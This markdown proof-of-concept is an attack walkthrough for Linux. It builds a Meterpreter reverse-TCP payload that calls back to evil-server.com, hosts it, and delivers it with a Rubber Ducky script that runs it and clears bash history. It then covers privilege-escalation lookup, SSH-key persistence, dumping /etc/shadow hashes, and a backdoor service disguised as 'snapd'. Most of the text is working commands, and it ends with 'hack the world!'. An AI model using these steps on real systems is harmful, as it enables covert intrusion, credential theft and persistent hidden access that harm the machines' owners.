# Meterpreter reverse tcp session POC

## Create the payload

```bash
# linux
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=evil-server.com LPORT=4444 -f elf > evil.elf
```

---

## Host the payload on a server

```bash
# creates a read-only server in a docker container
$ docker run -v /home/kali/payloads:/payloads:ro -p 80:80 -d nginx

# get the container id
$ docker container ls

# reconfigure nginx inside the container (change root to /payloads)
$ docker exec -it <id> bash
$ nano /etc/nginx/conf.d/default.conf

# create index.html
$ nano /payloads/index.html
```

---

## Create the ducky script

The script should:

0. open the terminal

1. fetch evil.elf from the server

2. chmod 700 filename

3. ./evil.elf &

4. move evil.elf into some location

5. close the terminal so .bash_history gets appended

6. clear tracks from .bash_history

7. close the terminal

---

## Listen to the connection

```bash
msf6 > use exploit/multi/handler
msf6 > set payload linux/x86/meterpreter/reverse_tcp
msf6 > set LHOST <LOCAL_IP>
msf6 > run
```

Plug in the rubber ducky and hack the world!

## Local enumeration & Persistence

```bash
# metasploit's linux exploit suggester
msf6> use post/multi/recon/local_exploit_suggester

# adds ssh public keys to the target's authorized_keys (ssh persistence)
msf6> use post/linux/manage/sshkey_persistence

# migrate the session to another process
meterpreter> pgrep <process_name>

# (once root) create ssh persistence for root
meterpreter> mkdir /root/.ssh
meterpreter> cp -r /home/someuser/.ssh /root/
meterpreter> mv /home/someuser/.snapd /root/

# ssh to the target
msf6> use auxiliary/scanner/ssh/ssh_login_pubkey
# set the ssh key
msf6> set KEY_PATH /home/kali/.msf4/loot/<keyfile>.txt

# upgrade from ssh to meterpreter session
msf6> use post/multi/manage/shell_to_meterpreter

# run post exploit module to get /etc/shadow
meterpreter> run post/linux/gather/hashdump
```

### Create a systemd service from snapd.elf

```bash
# create a unit file
$ touch snapd.service

# with the following contents
=====FILE START=======
[Unit]
Description=Service that handles snap queries.

[Install]
WantedBy=multi-user.target
After=network.target

[Service]
Type=simple
ExecStart=/root/.snapd/snap-store/common/snapd.elf
WorkingDirectory=/root/.snapd/snap-store/common
Restart=always
RestartSec=60
# optional
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=%n
=======FILE END=========

# move the unit file to the proper directory
$ mv snapd.service /etc/systemd/system

$ systemctl daemon-reload

$ systemctl enable snapd.service

$ systemctl start snapd.service

# confirm the status
$ systemctl status snapd.service

# see the logs
$ journalctl -f -u snapd.service
```

